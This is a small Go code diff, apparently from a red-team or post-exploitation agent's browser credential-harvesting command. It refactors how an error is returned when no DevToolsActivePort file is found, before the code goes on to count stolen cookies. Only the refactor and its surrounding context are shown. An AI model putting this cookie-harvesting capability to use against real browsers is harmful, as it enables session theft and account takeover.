@@ -39,11 +39,7 @@ func credBrowserLive(args credHarvestArgs) structs.CommandResult {
 			portFile := filepath.Join(dir, "DevToolsActivePort")
 			sb.WriteString(fmt.Sprintf("  %s: %s — not found\n", browser, portFile))
 		}
-		return structs.CommandResult{
-			Output:    sb.String(),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String())
 	}
 
 	totalCookies := 0
